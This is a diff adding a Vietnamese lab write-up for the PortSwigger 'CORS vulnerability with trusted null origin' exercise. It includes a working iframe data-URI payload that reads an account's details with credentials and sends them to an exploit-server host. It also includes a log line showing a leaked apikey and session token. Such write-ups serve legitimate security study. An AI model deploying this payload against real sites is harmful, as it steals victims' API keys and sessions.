@@ -23,6 +23,28 @@ Sau khi click "Deliver to victim", vào Access log ta thấy có một request v
 Thực hiện URL decode, rồi lấy giá trị của trường "apikey" để submit, kết quả thành công.
 
 # 2. CORS vulnerability with trusted null origin
+Nhận thấy trong request `/accountDetails`, khi đặt `Origin: null` thì response trả về chứa header `Access-Control-Allow-Origin: null`. Như vậy ta có thể exploit bằng cách dùng tag iframe để tự động thiết lập `Origin: null`.
+
+Vào exploi server và cấu hình đoạn code sau:
+```
+<iframe src="data:text/html,<script>let xhr = new XMLHttpRequest();
+xhr.onload = sendRequest;
+xhr.open('GET', 'https://0a47008204d3fe7bc0c6c26e00f2002c.web-security-academy.net/accountDetails');
+xhr.withCredentials = true;
+xhr.send();
+
+function sendRequest(){
+document.location='https://exploit-0a400044046dfe6ec0d3c132019600e6.exploit-server.net/?data='+this.responseText;
+}
+</script>">
+```
+
+Do thẻ iframe có thuộc tính `src="data:text/html,....`, Origin sẽ tự động được thiết lập là null và từ đó có thể bypass CORS. Sau khi click "Deliver to victim", vào trong Access log thì ta thấy có request:
+```
+10.0.4.254      2023-01-06 08:51:25 +0000 "GET /?data={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22n2daOK1lnvFCmG9DwadLa7iTt1vZieUi%22,%20%20%22sessions%22:%20[%20%20%20%20%22OZnSVCGK2EuB1QXu7RplVCP9Osicu5Gg%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
+```
+
+Tiến hành URL decode, ta thu được `apikey=n2daOK1lnvFCmG9DwadLa7iTt1vZieUi`. Submit thông tin có được, kết quả thành công.
 
 # 3. CORS vulnerability with trusted insecure protocols
 
